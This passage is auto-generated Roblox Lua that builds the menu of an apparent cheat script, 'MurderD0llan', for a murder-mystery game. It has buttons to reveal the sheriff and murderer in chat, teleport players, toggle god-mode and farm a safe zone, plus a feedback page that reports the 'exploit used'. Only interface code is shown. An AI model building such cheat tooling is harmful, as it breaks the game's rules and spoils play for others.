G2L["155"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["155"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["155"]["Size"] = UDim2.new(0, 56, 0, 61);
G2L["155"]["Name"] = [[star1]];
G2L["155"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["155"]["Text"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.RatingFrame.UIListLayout
G2L["156"] = Instance.new("UIListLayout", G2L["154"]);
G2L["156"]["FillDirection"] = Enum.FillDirection.Horizontal;
G2L["156"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["156"]["Padding"] = UDim.new(0, 2);
G2L["156"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.RatingFrame.star2
G2L["157"] = Instance.new("TextButton", G2L["154"]);
G2L["157"]["BorderSizePixel"] = 0;
G2L["157"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["157"]["TextSize"] = 14;
G2L["157"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["157"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["157"]["Size"] = UDim2.new(0, 56, 0, 61);
G2L["157"]["Name"] = [[star2]];
G2L["157"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["157"]["Text"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.RatingFrame.star3
G2L["158"] = Instance.new("TextButton", G2L["154"]);
G2L["158"]["BorderSizePixel"] = 0;
G2L["158"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["158"]["TextSize"] = 14;
G2L["158"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["158"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["158"]["Size"] = UDim2.new(0, 56, 0, 61);
G2L["158"]["Name"] = [[star3]];
G2L["158"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["158"]["Text"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.RatingFrame.star4
G2L["159"] = Instance.new("TextButton", G2L["154"]);
G2L["159"]["BorderSizePixel"] = 0;
G2L["159"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["159"]["TextSize"] = 14;
G2L["159"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["159"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["159"]["Size"] = UDim2.new(0, 56, 0, 61);
G2L["159"]["Name"] = [[star4]];
G2L["159"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["159"]["Text"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.RatingFrame.star5
G2L["15a"] = Instance.new("TextButton", G2L["154"]);
G2L["15a"]["BorderSizePixel"] = 0;
G2L["15a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15a"]["TextSize"] = 14;
G2L["15a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15a"]["Size"] = UDim2.new(0, 56, 0, 61);
G2L["15a"]["Name"] = [[star5]];
G2L["15a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15a"]["Text"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.RatingFrame.RatingSystem
G2L["15b"] = Instance.new("LocalScript", G2L["154"]);
G2L["15b"]["Name"] = [[RatingSystem]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.starcount
G2L["15c"] = Instance.new("TextLabel", G2L["14d"]);
G2L["15c"]["TextWrapped"] = true;
G2L["15c"]["BorderSizePixel"] = 0;
G2L["15c"]["TextScaled"] = true;
G2L["15c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15c"]["TextSize"] = 16;
G2L["15c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15c"]["LayoutOrder"] = 6;
G2L["15c"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["15c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15c"]["Text"] = [[zero stars (0)]];
G2L["15c"]["Name"] = [[starcount]];
G2L["15c"]["BackgroundTransparency"] = 1;
G2L["15c"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.FastSeparator
G2L["15d"] = Instance.new("TextLabel", G2L["14d"]);
G2L["15d"]["TextWrapped"] = true;
G2L["15d"]["BorderSizePixel"] = 0;
G2L["15d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15d"]["TextSize"] = 16;
G2L["15d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15d"]["LayoutOrder"] = 7;
G2L["15d"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["15d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15d"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["15d"]["Name"] = [[FastSeparator]];
G2L["15d"]["BackgroundTransparency"] = 1;
G2L["15d"]["Position"] = UDim2.new(0.0286103542894125, 0, 0.25438597798347473, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.TemplateButton
G2L["15e"] = Instance.new("TextButton", G2L["14d"]);
G2L["15e"]["TextWrapped"] = true;
G2L["15e"]["TextStrokeTransparency"] = 0;
G2L["15e"]["BorderSizePixel"] = 0;
G2L["15e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15e"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["15e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15e"]["TextSize"] = 20;
G2L["15e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["15e"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["15e"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["15e"]["LayoutOrder"] = 8;
G2L["15e"]["Name"] = [[TemplateButton]];
G2L["15e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15e"]["Text"] = [[Submit Feedback  ]];
G2L["15e"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.TemplateButton.UIGradient
G2L["15f"] = Instance.new("UIGradient", G2L["15e"]);
G2L["15f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.feedbacksystemworking
G2L["160"] = Instance.new("TextButton", G2L["14d"]);
G2L["160"]["TextWrapped"] = true;
G2L["160"]["Active"] = false;
G2L["160"]["BorderSizePixel"] = 0;
G2L["160"]["AutoButtonColor"] = false;
G2L["160"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["160"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["160"]["TextSize"] = 20;
G2L["160"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["160"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["160"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["160"]["Name"] = [[feedbacksystemworking]];
G2L["160"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["160"]["Text"] = [[¿FeedBack System Working?  ]];
G2L["160"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.feedbacksystemworking.Frame
G2L["161"] = Instance.new("Frame", G2L["160"]);
G2L["161"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["161"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["161"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["161"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.feedbacksystemworking.UIGradient
G2L["162"] = Instance.new("UIGradient", G2L["160"]);
G2L["162"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.Separator
G2L["163"] = Instance.new("TextLabel", G2L["14d"]);
G2L["163"]["TextWrapped"] = true;
G2L["163"]["BorderSizePixel"] = 0;
G2L["163"]["TextScaled"] = true;
G2L["163"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["163"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["163"]["TextSize"] = 16;
G2L["163"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["163"]["LayoutOrder"] = 9;
G2L["163"]["Size"] = UDim2.new(0, 347, 0, 231);
G2L["163"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["163"]["Text"] = [[This section is used to track ratings for our script while respecting your privacy. We do not record personally identifiable information, such as usernames.

When you submit your review, the following are sent:

-Current PlaceId
-Exploit used
-The rating given by the user
-The text entered by the user in the FeedbackBox.

We use feedback submitted in good faith to improve this GUI script and provide better support. Thank you!]];
G2L["163"]["Name"] = [[Separator]];
G2L["163"]["BackgroundTransparency"] = 1;
G2L["163"]["Position"] = UDim2.new(0.014986376278102398, 0, -0.04179951176047325, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search
G2L["164"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["164"]["Active"] = true;
G2L["164"]["BorderSizePixel"] = 0;
G2L["164"]["CanvasSize"] = UDim2.new(0, 0, 3, 0);
G2L["164"]["TopImage"] = [[]];
G2L["164"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["164"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["164"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["164"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["164"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["164"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["164"]["Visible"] = false;
G2L["164"]["Name"] = [[ALT_page_search]];
G2L["164"]["BottomImage"] = [[]];
-- Attributes
G2L["164"]:SetAttribute([[OLD_PAGE]], [[nil]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.UIListLayout
G2L["165"] = Instance.new("UIListLayout", G2L["164"]);
G2L["165"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["165"]["Padding"] = UDim.new(0, 5);
G2L["165"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.TextLabel
G2L["166"] = Instance.new("TextLabel", G2L["164"]);
G2L["166"]["TextWrapped"] = true;
G2L["166"]["BorderSizePixel"] = 0;
G2L["166"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["166"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["166"]["TextSize"] = 16;
G2L["166"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["166"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["166"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["166"]["Text"] = [[search for anything]];
G2L["166"]["BackgroundTransparency"] = 1;
G2L["166"]["Position"] = UDim2.new(-0.00136239780113101, 0, 0.75, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.Template
G2L["167"] = Instance.new("Frame", G2L["164"]);
G2L["167"]["ZIndex"] = 3;
G2L["167"]["BackgroundColor3"] = Color3.fromRGB(150, 150, 150);
G2L["167"]["Size"] = UDim2.new(0, 341, 0, 100);
G2L["167"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["167"]["Position"] = UDim2.new(0.06666667014360428, 0, 0.2783018946647644, 0);
G2L["167"]["Visible"] = false;
G2L["167"]["Name"] = [[Template]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.Template.Information
G2L["168"] = Instance.new("TextLabel", G2L["167"]);
G2L["168"]["TextWrapped"] = true;
G2L["168"]["BorderSizePixel"] = 0;
G2L["168"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["168"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["168"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["168"]["TextSize"] = 20;
G2L["168"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["168"]["Size"] = UDim2.new(0, 248, 0, 44);
G2L["168"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["168"]["Text"] = [[  %s in page %f - %s]];
G2L["168"]["Name"] = [[Information]];
G2L["168"]["BackgroundTransparency"] = 1;
G2L["168"]["Position"] = UDim2.new(2.2373590979896107e-08, 0, 0, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.Template.UIGradient
G2L["169"] = Instance.new("UIGradient", G2L["167"]);
G2L["169"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(208, 208, 208))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.Template.ViewInPage
G2L["16a"] = Instance.new("TextButton", G2L["167"]);
G2L["16a"]["TextWrapped"] = true;
G2L["16a"]["TextScaled"] = true;
G2L["16a"]["BackgroundColor3"] = Color3.fromRGB(95, 95, 95);
G2L["16a"]["TextSize"] = 14;
G2L["16a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16a"]["Size"] = UDim2.new(0, 72, 0, 32);
G2L["16a"]["Name"] = [[ViewInPage]];
G2L["16a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16a"]["Text"] = [[View in page]];
G2L["16a"]["Position"] = UDim2.new(0.7712609767913818, 0, 0.05999999865889549, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.Template.ViewPortFrame
G2L["16b"] = Instance.new("Frame", G2L["167"]);
G2L["16b"]["ZIndex"] = 2;
G2L["16b"]["BackgroundColor3"] = Color3.fromRGB(177, 177, 177);
G2L["16b"]["Size"] = UDim2.new(0, 341, 0, 56);
G2L["16b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16b"]["Position"] = UDim2.new(0, 0, 0.4399999976158142, 0);
G2L["16b"]["Name"] = [[ViewPortFrame]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.Template.ViewPortFrame.UIListLayout
G2L["16c"] = Instance.new("UIListLayout", G2L["16b"]);
G2L["16c"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["16c"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["16c"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.Template.ViewPortFrame.UIGradient
G2L["16d"] = Instance.new("UIGradient", G2L["16b"]);
G2L["16d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(208, 208, 208))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.Template.ApplyInformation
G2L["16e"] = Instance.new("ModuleScript", G2L["167"]);
G2L["16e"]["Name"] = [[ApplyInformation]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.LocalScript
G2L["16f"] = Instance.new("LocalScript", G2L["164"]);


-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5
G2L["170"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["170"]["Active"] = true;
G2L["170"]["BorderSizePixel"] = 0;
G2L["170"]["CanvasSize"] = UDim2.new(0, 0, 0, 574);
G2L["170"]["TopImage"] = [[]];
G2L["170"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["170"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["170"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["170"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["170"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["170"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["170"]["Visible"] = false;
G2L["170"]["Name"] = [[page_5]];
G2L["170"]["BottomImage"] = [[]];
-- Attributes
G2L["170"]:SetAttribute([[WIP]], true);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.UIListLayout
G2L["171"] = Instance.new("UIListLayout", G2L["170"]);
G2L["171"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["171"]["Padding"] = UDim.new(0, 5);
G2L["171"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.TemplateButton
G2L["172"] = Instance.new("TextButton", G2L["170"]);
G2L["172"]["TextWrapped"] = true;
G2L["172"]["TextStrokeTransparency"] = 0;
G2L["172"]["BorderSizePixel"] = 0;
G2L["172"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["172"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["172"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["172"]["TextSize"] = 20;
G2L["172"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["172"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["172"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["172"]["Name"] = [[TemplateButton]];
G2L["172"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["172"]["Text"] = [[Tell Sherrif And Murderer in Chat  ]];
G2L["172"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.TemplateButton.UIGradient
G2L["173"] = Instance.new("UIGradient", G2L["172"]);
G2L["173"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.tellblueandredinchat
G2L["174"] = Instance.new("TextButton", G2L["170"]);
G2L["174"]["TextWrapped"] = true;
G2L["174"]["TextStrokeTransparency"] = 0;
G2L["174"]["BorderSizePixel"] = 0;
G2L["174"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["174"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["174"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["174"]["TextSize"] = 20;
G2L["174"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["174"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["174"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["174"]["Name"] = [[tellblueandredinchat]];
G2L["174"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["174"]["Text"] = [[Tell Blue And Red In Chat  ]];
G2L["174"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.tellblueandredinchat.Frame
G2L["175"] = Instance.new("Frame", G2L["174"]);
G2L["175"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["175"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["175"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["175"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.tellblueandredinchat.UIGradient
G2L["176"] = Instance.new("UIGradient", G2L["174"]);
G2L["176"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.FastSeparator
G2L["177"] = Instance.new("TextLabel", G2L["170"]);
G2L["177"]["TextWrapped"] = true;
G2L["177"]["BorderSizePixel"] = 0;
G2L["177"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["177"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["177"]["TextSize"] = 16;
G2L["177"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["177"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["177"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["177"]["Text"] = [[- - -  ]];
G2L["177"]["Name"] = [[FastSeparator]];
G2L["177"]["BackgroundTransparency"] = 1;
G2L["177"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.bringmurderclientsided
G2L["178"] = Instance.new("TextButton", G2L["170"]);
G2L["178"]["TextWrapped"] = true;
G2L["178"]["TextStrokeTransparency"] = 0;
G2L["178"]["BorderSizePixel"] = 0;
G2L["178"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["178"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["178"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["178"]["TextSize"] = 20;
G2L["178"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["178"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["178"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["178"]["Name"] = [[bringmurderclientsided]];
G2L["178"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["178"]["Text"] = [[Bring Murder (CLIENT-SIDED)  ]];
G2L["178"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.bringmurderclientsided.Frame
G2L["179"] = Instance.new("Frame", G2L["178"]);
G2L["179"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["179"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["179"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["179"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.bringmurderclientsided.UIGradient
G2L["17a"] = Instance.new("UIGradient", G2L["178"]);
G2L["17a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.bringsheriffclientsided
G2L["17b"] = Instance.new("TextButton", G2L["170"]);
G2L["17b"]["TextWrapped"] = true;
G2L["17b"]["TextStrokeTransparency"] = 0;
G2L["17b"]["BorderSizePixel"] = 0;
G2L["17b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17b"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["17b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17b"]["TextSize"] = 20;
G2L["17b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["17b"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["17b"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["17b"]["Name"] = [[bringsheriffclientsided]];
G2L["17b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17b"]["Text"] = [[Bring Sheriff (CLIENT-SIDED)  ]];
G2L["17b"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.bringsheriffclientsided.Frame
G2L["17c"] = Instance.new("Frame", G2L["17b"]);
G2L["17c"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["17c"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["17c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17c"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.bringsheriffclientsided.UIGradient
G2L["17d"] = Instance.new("UIGradient", G2L["17b"]);
G2L["17d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.TemplateButton
G2L["17e"] = Instance.new("TextButton", G2L["170"]);
G2L["17e"]["TextWrapped"] = true;
G2L["17e"]["TextStrokeTransparency"] = 0;
G2L["17e"]["BorderSizePixel"] = 0;
G2L["17e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17e"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["17e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17e"]["TextSize"] = 20;
G2L["17e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["17e"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["17e"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["17e"]["Name"] = [[TemplateButton]];
G2L["17e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17e"]["Text"] = [[God-Mode (Kills You)  ]];
G2L["17e"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.TemplateButton.UIGradient
G2L["17f"] = Instance.new("UIGradient", G2L["17e"]);
G2L["17f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.safezonefarm
G2L["180"] = Instance.new("TextButton", G2L["170"]);
G2L["180"]["TextWrapped"] = true;
G2L["180"]["TextStrokeTransparency"] = 0;
G2L["180"]["BorderSizePixel"] = 0;
G2L["180"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["180"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["180"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["180"]["TextSize"] = 20;
G2L["180"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["180"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["180"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["180"]["Name"] = [[safezonefarm]];
G2L["180"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["180"]["Text"] = [[Safe-Zone Farm  ]];
G2L["180"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.safezonefarm.Frame
G2L["181"] = Instance.new("Frame", G2L["180"]);
G2L["181"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["181"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["181"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["181"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.safezonefarm.UIGradient
G2L["182"] = Instance.new("UIGradient", G2L["180"]);
